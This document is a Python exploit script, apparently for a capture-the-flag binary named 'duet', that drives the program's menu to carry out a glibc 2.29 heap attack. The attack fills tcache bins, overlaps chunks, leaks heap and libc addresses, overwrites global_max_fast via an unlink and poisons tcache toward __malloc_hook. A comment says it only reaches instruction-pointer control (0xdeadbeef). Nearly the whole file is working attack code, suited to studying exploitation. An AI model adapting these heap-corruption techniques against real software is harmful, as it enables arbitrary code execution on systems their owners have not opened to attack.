#!/usr/bin/env python3
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './duet'
context(os = 'linux', arch = 'amd64')
context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':['./duet_wo_seccomp'], 'aslr':False, 'gdbscript':''}, \
                        local   = {'argv':[bin_file]}, \
                        # remote  = {'host':'target', 'port':4296})
                        remote  = {'host':'localhost', 'port':4296})
env.set_item('libc',    debug   = None, \
                        local   = None, \
                        remote  = 'libc-2.29.so')
env.select()

#==========

binf = ELF(bin_file)
'''
addr_plt_puts       = binf.plt['puts']
addr_got_main       = binf.got['__libc_start_main']
addr_bss            = binf.sep_section['.bss']
addr_main           = binf.sep_function['main']
'''

libc = ELF(env.libc) if env.libc else binf.libc
'''
offset_libc_main        = libc.sep_function['__libc_start_main']
'''
offset_libc_malloc_hook = libc.symbols['__malloc_hook']
offset_libc_mainarena   = offset_libc_malloc_hook + 0x10
offset_libc_free_hook   = libc.symbols['__free_hook']
offset_libc_max_fast    = offset_libc_free_hook + 0x58

#==========

# this exploit is incomplete
# only getting rip (0xdeadbeef)

def attack(conn, **kwargs):
    d = Duet(conn)

    for _ in range(7):
        d.alloc(0, 0x88, '0'*0x10)
        d.free(0)
    for _ in range(7):
        d.alloc(0, 0xb8, '1'*0x10)
        d.free(0)
    for _ in range(7):
        d.alloc(0, 0x178, '2'*0x10)
        d.free(0)
    for _ in range(7):
        d.alloc(0, 0x198, '3'*0x10)
        d.free(0)
    for _ in range(4):
        d.alloc(0, 0x98, '4'*0x10)
        d.free(0)

    d.alloc(0, 0x178, 'a'*0x10)
    d.alloc(1, 0x98, '5'*0x10)
    d.free(0)
    d.free(1)

    d.alloc(0, 0xb8, 'b'*0x10)
    d.alloc(1, 0x98, b'6'*0x80 + p64(0xc0) + p64(0x10))
    d.free(0)

    d.overwrite(0xc1)
    d.alloc(0, 0x98, b'7'*0x28 + p64(0x1a1))
    d.free(0)
    d.alloc(0, 0xa8, (b'c'*0x38 + p64(0x11)+p64(0)+p64(0x11)).ljust(0x88) + p64(0x21)+p64(0xa0)+p64(0x10))

    leak = d.read(1)[0x70:0x80]
    addr_heap_base = u64(leak[:8]) - 0x19e0
    info('addr_heap_base    = 0x{:08x}'.format(addr_heap_base))

    addr_libc_mainarena = u64(leak[8:]) - 0x70
    libc.address = addr_libc_mainarena - offset_libc_mainarena
    info('addr_libc_base    = 0x{:08x}'.format(libc.address))
    addr_libc_max_fast      = libc.address + offset_libc_max_fast
    addr_libc_free_hook     = libc.symbols['__free_hook']
    addr_libc_malloc_hook   = libc.symbols['__malloc_hook']
    addr_libc_stdout        = libc.symbols['_IO_2_1_stdout_']

    d.free(1)
    d.alloc(1, 0x108, b'd'*0x10)
    d.free(1)

    d.alloc(1, 0x88, b'e'*0x48 + p64(0x91))
    d.free(1)
    d.free(0)
    d.alloc(1, 0x88, b'E'*0x48 + p64(0xa1) + p64(addr_libc_mainarena+0x60)*2)
    d.free(1)

    # unsorted -> small
    d.alloc(0, 0xb8, b'f'*0x8 + p64(0x11))
    d.free(0)

    fake_chunk  = p64(0xa1)
    fake_chunk += p64(0xdeadbeef)
    fake_chunk += p64(addr_heap_base + 0x1ab0)
    fake_chunk += p64(addr_heap_base + 0x1aa0)
    fake_chunk += p64(addr_libc_max_fast - 0x10)
    d.alloc(1, 0x88, b'E'*0x48 + fake_chunk)

    # small -> tcache (unlink attack : global_max_fast overwrite)
    d.alloc(0, 0x98, b'X'*0x38 + p64(0x11))

    d.free(1)
    d.alloc(1, 0x88, b'E'*0x48 + p64(0xc1))
    d.free(1)
    d.free(0)

    d.alloc(1, 0x88, b'E'*0x48 + p64(0xc1) + p64(addr_libc_malloc_hook - 0x24))
    d.free(1)
    d.alloc(0, 0xb8, b'X'*0x18)
    d.alloc(1, 0xa8, b'Y'*0x14 + p64(0xdeadbeef))

    input('>')
    d.free(0)
    conn.sendlineafter(': ', '1')
    conn.sendlineafter('Instrument: ', '琴')
    input('>')
    conn.sendlineafter('Duration: ', '128')

class Duet:
    def __init__(self, conn):
        self.recvuntil      = conn.recvuntil
        self.recv           = conn.recv
        self.sendline       = conn.sendline
        self.send           = conn.send
        self.sendlineafter  = conn.sendlineafter
        self.sendafter      = conn.sendafter

    def alloc(self, inst, size, data):
        self.sendlineafter(': ', '1')
        self.sendlineafter('Instrument: ', '琴' if inst == 0 else '瑟')
        self.sendlineafter('Duration: ', str(size))
        self.sendafter('Score: ', data.ljust(size))

    def free(self, inst):
        self.sendlineafter(': ', '2')
        self.sendlineafter('Instrument: ', '琴' if inst == 0 else '瑟')

    def read(self, inst):
        self.sendlineafter(': ', '3')
        self.sendlineafter('Instrument: ', '琴' if inst == 0 else '瑟')
        self.recvuntil(': ')
        return self.recvuntil('\n1.', drop=True)

    def overwrite(self, val):
        self.sendlineafter(': ', '5')
        self.sendlineafter(': ', str(val))

#==========

def main():
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.run(attack)
    comn.interactive()

if __name__=='__main__':
    main()

#==========
